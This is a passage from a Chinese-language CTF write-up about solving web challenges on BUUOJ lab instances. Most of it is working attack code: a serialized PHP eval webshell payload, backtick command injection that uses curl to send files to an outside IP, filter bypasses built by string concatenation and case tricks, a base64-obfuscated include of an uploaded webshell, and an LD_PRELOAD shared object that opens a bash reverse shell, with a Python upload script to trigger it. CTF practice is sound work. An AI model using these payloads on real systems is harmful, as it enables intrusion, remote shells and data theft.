...
$a->f1->a->f1->v1->f1->m1="?><?php eval(\$_POST[1]);phpinfo();";

echo serialize($a);
```

网站目录很多文件，直接`nl *`查看注释发现flag
...
这个eval是可以直接利用反引号RCE，然后避免抛出错误，需要加个注释。

```http
GET /calc?num=111%23`curl%09http://10.88.15.90:4444/` HTTP/1.1
Host: 481a86ac-e194-48e1-a025-76f019b938fc.node5.buuoj.cn:81
Referer: http://481a86ac-e194-48e1-a025-76f019b938fc.node5.buuoj.cn:81/
...
111%23`curl%09-T%09/tmp/log.txt%0910.88.15.90:4444`
...
可以利用file_get_content，有过滤，需要拼接函数

```php
<?php echo ('fil'.'e'.'_g'.'et'.'_co'.'nte'.'nts')('/var/www/html/index.php');
```
...
可以大小写绕过，上传一个一句话，再用include文件包含即可
...
<?php InClude('php://filter/convert.base64-decode/resource=/var/www/html/uploads/9bc09ee4e0eb91840f7c5207e1d84852.php');


<?php InClude(base64_decode('cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL3VwbG9hZHMvOWJjMDllZTRlMGViOTE4NDBmN2M1MjA3ZTFkODQ4NTIucGhw'));
```

读取不了flag，试了几种常见的方式都不行，而且antsword也链接不上。准备劫持so文件getshell
...
void __attribute__ ((constructor)) DUP_malloc_init(void) {
    unsetenv("LD_PRELOAD");
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.88.15.87/4444 0>&1'");
}
//gcc -shared -fPIC 1.c -o 1.so
```

利用`move_uploaded_file`传上去

```python
import requests

url="http://2aa80e5c-8665-42f9-8169-e9872b97c728.node5.buuoj.cn:81/uploads/f3b94e88bd1bd325af6f62828c8785dd.php"

def upload_so(filename,local,cmd):
...
if __name__=='__main__':
    cmd=(
        "putenv('LD_PRELOAD=/tmp/1.so');"
        +'mail("a@localhost","","","","");'
        +'echo 1;'
    )
    upload_so('/tmp/1.so','1.so',cmd)
```
...
>
> https://www.cnblogs.com/kingbridge/articles/16079802.html
